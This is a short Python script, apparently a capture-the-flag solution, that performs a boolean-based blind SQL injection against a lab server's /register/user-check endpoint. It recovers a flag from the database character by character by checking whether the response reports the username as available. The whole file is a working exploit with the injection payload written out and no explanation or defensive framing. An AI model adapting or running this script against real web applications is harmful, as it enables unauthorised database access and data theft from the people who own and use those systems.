import requests
import string
import json


server = "10.10.26.213"
flag = ""
loop =1

while chr(124) not in flag:
    for a in range (48, 126):
         response = requests.get(url="http://"+server+f"/register/user-check?username=test111' or (ASCII(SUBSTRING((SELECT flag FROM flag LIMIT+0,1),{loop},1))) = '{a}'-- -")
         json_response = response.json()
         

        
         if json_response['available'] == False:
            
            flag += chr(a)
            loop += 1
            print("Find flag:",flag, end="\r\n")
            break # if find the flag, exit for loop, save RAM
print("Flag found: ", flag)


    